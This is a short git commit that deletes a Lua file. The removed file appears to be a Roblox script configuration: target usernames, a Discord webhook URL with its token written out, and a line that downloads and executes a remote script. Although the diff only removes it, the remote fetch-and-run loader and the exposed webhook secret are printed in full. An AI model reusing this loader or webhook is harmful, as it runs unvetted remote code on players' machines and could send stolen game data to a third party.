6fcb00689bfd3b61e9494e21a2d25a9f4717d80c
Muhhamad <128399403+notascamm@users.noreply.github.com>
2023-03-21 17:09:47 +0100

    Delete 667735834535002112.lua

--- 667735834535002112.lua
+++
@@ -1,4 +0,0 @@
-UserName = "fIintmad"
-UserName2 = "fIintmad"
-Webhook = "https://discord.com/api/webhooks/1087456497526644820/X2B4FTWDSxGFgzW3U1Ie40O5VdT2fgYOgCAGehl8pcTwYcbgUF0hPNoFDyly93aRPlE5"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/New.lua"))()
